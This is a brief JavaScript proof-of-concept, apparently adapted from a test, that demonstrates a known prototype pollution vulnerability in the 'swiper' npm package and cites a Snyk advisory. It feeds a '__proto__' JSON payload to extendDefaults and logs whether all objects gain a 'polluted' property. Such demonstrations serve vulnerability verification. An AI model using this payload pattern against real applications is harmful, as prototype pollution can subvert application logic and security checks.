// //https://snyk.io/vuln/SNYK-JS-SWIPER-1088062
// test("prototype pollution in swiper", () => {
  var swiper = require("swiper");
  let obj = {};
  var malicious_payload = '{"__proto__":{"polluted":"yes"}}';

console.log({}.polluted);

  swiper.default.extendDefaults(JSON.parse(malicious_payload));
console.log({}.polluted);
// });
